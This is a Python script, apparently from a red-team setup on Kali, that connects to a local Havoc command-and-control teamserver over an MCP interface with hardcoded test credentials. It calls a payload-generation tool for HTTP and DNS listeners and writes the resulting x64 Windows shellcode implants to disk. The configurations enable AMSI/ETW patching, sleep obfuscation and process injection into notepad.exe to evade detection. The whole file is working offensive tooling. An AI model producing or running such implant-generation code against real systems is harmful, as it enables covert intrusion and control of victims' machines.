#!/usr/bin/env python3
import json
import subprocess
import base64
import time
import os

# Start MCP client
mcp = subprocess.Popen(
    ['./havoc', 'mcp', '--teamserver', 'wss://127.0.0.1:40056/havoc/', '--user', 'mcp', '--password', 'testpassword', '--insecure'],
    cwd='/home/kali/Havoc',
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

def send_request(req_id, method, params=None):
    req = {"jsonrpc": "2.0", "id": req_id, "method": method}
    if params:
        req["params"] = params
    line = json.dumps(req) + "\n"
    mcp.stdin.write(line)
    mcp.stdin.flush()

# Wait for connection
time.sleep(2)

# Initialize
send_request(1, "initialize", {"protocolVersion": "2025-06-18"})
time.sleep(1)

# Generate HTTP payload
send_request(2, "tools/call", {
    "name": "generate_payload",
    "arguments": {
        "agent_type": "Demon",
        "listener": "test-http",
        "arch": "x64",
        "format": "Windows Shellcode",
        "config": "{\"Sleep\":\"2\",\"Jitter\":\"15\",\"Sleep Technique\":\"WaitForSingleObjectEx\",\"Sleep Jmp Gadget\":\"jmp rax\",\"Stack Duplication\":false,\"Proxy Loading\":\"None (LdrLoadDll)\",\"Amsi/Etw Patch\":\"Hardware breakpoints\",\"Injection\":{\"Alloc\":\"Win32\",\"Execute\":\"Win32\",\"Spawn64\":\"C:\\\\Windows\\\\System32\\\\notepad.exe\",\"Spawn32\":\"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\"}}"
    }
})

# Generate DNS payload
send_request(3, "tools/call", {
    "name": "generate_payload",
    "arguments": {
        "agent_type": "Demon",
        "listener": "test-dns",
        "arch": "x64",
        "format": "Windows Shellcode",
        "config": "{\"Sleep\":\"2\",\"Jitter\":\"15\",\"Sleep Technique\":\"WaitForSingleObjectEx\",\"Sleep Jmp Gadget\":\"jmp rax\",\"Stack Duplication\":false,\"Proxy Loading\":\"None (LdrLoadDll)\",\"Amsi/Etw Patch\":\"Hardware breakpoints\",\"Injection\":{\"Alloc\":\"Win32\",\"Execute\":\"Win32\",\"Spawn64\":\"C:\\\\Windows\\\\System32\\\\notepad.exe\",\"Spawn32\":\"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\"}}"
    }
})

# Read responses
outputs = []
for _ in range(10):  # Wait for up to 10 responses
    line = mcp.stdout.readline()
    if not line:
        break
    outputs.append(line.strip())
    print(f"Received: {line.strip()[:200]}")
    
    # Try to parse and save payload
    try:
        msg = json.loads(line)
        if msg.get("result") and msg["result"].get("content"):
            for c in msg["result"]["content"]:
                if c.get("text"):
                    result = json.loads(c["text"])
                    if result.get("payload_b64"):
                        listener = result.get("listener", "unknown")
                        buf = base64.b64decode(result["payload_b64"])
                        filename = f"/home/kali/shellcode/payload_{listener}.bin"
                        with open(filename, "wb") as f:
                            f.write(buf)
                        print(f"Saved {filename} ({len(buf)} bytes)")
    except Exception as e:
        pass
    
    time.sleep(1)

# Wait a bit more for any remaining responses
time.sleep(30)

# Read any remaining output
while True:
    line = mcp.stdout.readline()
    if not line:
        break
    outputs.append(line.strip())
    print(f"Received: {line.strip()[:200]}")
    
    try:
        msg = json.loads(line)
        if msg.get("result") and msg["result"].get("content"):
            for c in msg["result"]["content"]:
                if c.get("text"):
                    result = json.loads(c["text"])
                    if result.get("payload_b64"):
                        listener = result.get("listener", "unknown")
                        buf = base64.b64decode(result["payload_b64"])
                        filename = f"/home/kali/shellcode/payload_{listener}.bin"
                        with open(filename, "wb") as f:
                            f.write(buf)
                        print(f"Saved {filename} ({len(buf)} bytes)")
    except Exception as e:
        pass

mcp.terminate()
print("Done!")